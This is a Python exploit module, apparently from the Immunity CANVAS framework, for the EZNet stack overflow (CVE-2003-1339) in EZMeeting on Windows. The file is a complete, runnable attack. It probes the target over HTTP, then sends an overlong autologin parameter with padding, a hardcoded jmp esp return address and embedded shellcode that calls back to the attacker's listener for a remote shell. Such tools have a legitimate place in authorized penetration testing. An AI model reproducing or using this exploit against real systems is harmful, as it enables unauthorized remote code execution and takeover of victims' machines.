#! /usr/bin/env python
"""
eznet.py

EZNET Stack Overflow originally found by Peter Winter-Smith
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

#note: Both UUIDs listed are vulnerable, but one is only there after it has
#been tickled from localhost. So we use the other one.

NAME="eznet"
VERSION="1.0"
NOTES="""


"""

CHANGELOG="""
1.0 
Created.
"""

DEBUGNOTES="""
 
"""

import getopt, sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")

        
from exploitutils import *
sys.path.append('encoder')
import addencoder
import chunkedaddencoder
sys.path.append("shellcode")
import win32shell
sys.path.append("gui")

from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="EZMeeting"
DOCUMENTATION["Date public"]="12/07/2003"
DOCUMENTATION["CERT Advisory"]=""
DOCUMENTATION["CVE Name"] = "CVE-2003-1339"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1339"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]=["http://www.ezmeeting.com/Products.html","http://www.elitehaven.net/ezstackoverflow.txt"]
DESCRIPTION="EZNet stack overflow"
VERSION="0.1"
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]
GTK2_DIALOG="dialog.glade2"
NOTES=""" 

"""
CHANGELOG="""

"""

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(82)
        self.setHost("")
        self.setVersion(0)
        self.badstring=".\x00%/\\ \r\n&?"
        self.searchbadstring="\x00\\/.:$"
        self.istest=0
        self.setVersions()
        self.tag1="AACC"
        self.tag2="ACCB"
        self.localhost=""
        self.localport=0
        self.ssl=0
        self.setVersions()
        
        self.name=NAME        
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        return self.createWin32Shellcode(self.badstring,host,port)

    def test(self):        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        


        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))        
            test = "GET /SwEzModule.dll?operation=login&autologin= HTTP/1.0\r\n\r\n"
           
            self.websend(s, test)
            data = self.webrecv(s)
            self.log("Received: %s"%data)
        except:
            self.log("Couldn't connect to the server")
            return 0
        if data.find("swstatus")!=-1:
            self.setVersion(1)
            return 1
       
        return 0


    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        #print "Self.version=%d"%self.version
        if self.version==0:
            if self.test()==0:
                self.log("Not continuing since no target was found")
                return 0
            else:
                self.createShellcode()
        sploitstring=self.makesploit()
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("sploitstring is length %d"%len(sploitstring))
            self.websend(s, sploitstring)
            data = self.webrecv(s)
            s.close()
        except:
            self.log("Attack reported no open socket - service died?")
        return 1
       

    def setVersions(self):
        self.versions={}
        #version array: name EIP (jmp esp)
        self.versions[1]=("EZNET 3.3->3.5.0", 0x1004c72b) 
        
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
    
    def makesploit(self):
        self.log("Attacking version %s"%self.versions[self.version][0])
        eip = self.versions[self.version][1]
        request = "GET /SwEzModule.dll?operation=login&autologin="
        jmpstr="\xe9\xc9\xcd\xff\xff"
        attackstr="A"*30+"A"*4623+intel_order(eip)+"A"*5+jmpstr
        request += attackstr
        request += " HTTP/1.0\r\n\r\n"
        request = stroverwrite(request, self.shellcode, 80)

        return request

    def usage(self):
        print "Usage: "+sys.argv[0]+" [-T] [-v version]  -t target [ -p targetport:80] -l localip -d localport [-s ssl[0]] "
        self.displayVersions()

#this stuff happens.
if __name__ == '__main__':    
    print "Running "+NAME+" exploit v "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)
